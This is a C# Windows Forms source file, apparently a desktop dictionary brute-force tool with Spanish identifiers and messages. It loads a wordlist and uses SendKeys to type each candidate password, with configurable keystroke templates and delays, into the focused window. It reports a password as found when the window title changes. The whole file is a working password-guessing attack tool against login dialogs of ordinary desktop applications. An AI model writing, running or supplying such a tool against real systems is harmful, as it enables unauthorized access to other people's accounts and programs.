using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;

namespace DesktopBruteForcing
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", SetLastError = true)]
        internal static extern int GetWindowTextLength(IntPtr hwnd);

        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPTStr)] StringBuilder lpString, int nMaxCount);


        private const string SEPARADOR_TIEMPO = "##";
        private const string PALABRA_RESERVADA = "$$";
        private const string FICHERO_LOG = "log.txt";


        private bool AtaqueEnMarcha { get; set; }
        private List<string> Diccionario { get; set; }

        private string TituloVentanaAtaque { get; set; }
        private IntPtr? PunteroVentanaAplicacion { get; set; }


        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }

        #region Eventos
        private void Form1_Activated(object sender, EventArgs e)
        {
            if (this.PunteroVentanaAplicacion == null)
            {
                this.PunteroVentanaAplicacion = GetForegroundWindow();
            }
        }

        private void dButtonExaminar_Click(object sender, EventArgs e)
        {
            OpenFileDialog lObjDialog = new OpenFileDialog();
            lObjDialog.Multiselect = false;
            if (lObjDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                this.dTextBoxRuta.Text = lObjDialog.FileName;
            }
        }

        private void dButtonIniciar_Click(object sender, EventArgs e)
        {
            if (this.AtaqueEnMarcha)
            {
            }
            else if (this.ValidarFormulario())
            {
                this.PrepararDiccionarioAtaque();

                MessageBox.Show("Una vez cerrada esta ventana tiene 3 segundos para establecer el foco sobre el campo en el que quiere realizar el ataque.",
                    "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);

                Thread.Sleep(3000);

                Thread lObjHilo = new Thread(new ThreadStart(this.IniciarAtaque));
                lObjHilo.Start();
            }
        }
        #endregion

        #region Miembros privados
        public void Registro(string pStrMensaje, bool pBlnIncluirFecha = true)
        {
            string lStrMensaje = "";

            if (pBlnIncluirFecha)
            {
                lStrMensaje = "[" + DateTime.Now + "] ";
            }

            lStrMensaje += pStrMensaje + Environment.NewLine;

            this.dTextBoxLog.Text = lStrMensaje + this.dTextBoxLog.Text;
        }

        private string ObtenerTextoDeTituloVentanaFoco()
        {
            IntPtr lPtrVentana = GetForegroundWindow();
            int lIntLongitud = GetWindowTextLength(lPtrVentana);
            StringBuilder lObjStringBuilder = new StringBuilder(lIntLongitud + 1);
            GetWindowText(lPtrVentana, lObjStringBuilder, lObjStringBuilder.Capacity);
            return lObjStringBuilder.ToString();
        }

        private void IniciarAtaque()
        {
            try
            {
                this.TituloVentanaAtaque = this.ObtenerTextoDeTituloVentanaFoco();

                foreach (string lStrPalabra in this.Diccionario)
                {
                    this.Registro("Probando la clave -" + lStrPalabra + "-");

                    string lStrPulsacionFinal = this.dTextBoxPulsacionesEntrePalabras.Text.Replace(PALABRA_RESERVADA, lStrPalabra);
                    while (lStrPulsacionFinal.Length > 0)
                    {
                        string lStrToken = lStrPulsacionFinal;

                        //Buscamos un tiempo muerto
                        int lIntInicio = lStrPulsacionFinal.IndexOf(SEPARADOR_TIEMPO);
                        int lIntFin = lStrPulsacionFinal.IndexOf(SEPARADOR_TIEMPO, lIntInicio + 1);

                        if (lIntInicio != -1 && lIntFin != -1)
                        {
                            lStrToken = lStrPulsacionFinal
                                .Substring(0, lIntInicio);
                        }
                        else if ((lIntInicio != -1 && lIntFin == -1) || (lIntInicio == -1 && lIntFin != -1))
                        {
                            MessageBox.Show("Proceso cancelado, sintáxis incorrecta");
                            break;
                        }

                        SendKeys.SendWait(lStrToken);

                        if (lIntInicio != -1 && lIntFin != -1)
                        {
                            string lStrValor = lStrPulsacionFinal.Substring(lIntInicio + SEPARADOR_TIEMPO.Length, lIntFin - lIntInicio - SEPARADOR_TIEMPO.Length);
                            int lIntValor = int.Parse(lStrValor);

                            Thread.Sleep(lIntValor);
                        }

                        lStrPulsacionFinal = lStrPulsacionFinal.Substring(lIntFin + SEPARADOR_TIEMPO.Length);
                    }

                    if (this.TituloVentanaAtaque != this.ObtenerTextoDeTituloVentanaFoco())
                    {
                        this.Registro("El proceso ha identificado como clave válida la palabra -" + lStrPalabra + "-");
                        MessageBox.Show("El proceso ha identificado como clave válida la palabra -" + lStrPalabra + "-");
                        break;
                    }
                }
            }
            catch (Exception lObjExcepcion)
            {
                this.Registro("Se ha capturado la excepcion: " + lObjExcepcion.ToString());
            }
        }

        private void PrepararDiccionarioAtaque()
        {
            this.Diccionario = File.ReadAllLines(this.dTextBoxRuta.Text).ToList();
        }

        private bool ValidarFormulario()
        {
            bool lBlnResultado = true;

            if (!File.Exists(this.dTextBoxRuta.Text))
            {
                MessageBox.Show("No se encontró el fichero con el diccionario para realizar la fuerza bruta", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                lBlnResultado = false;
            }

            return lBlnResultado;
        }
        #endregion
    }
}
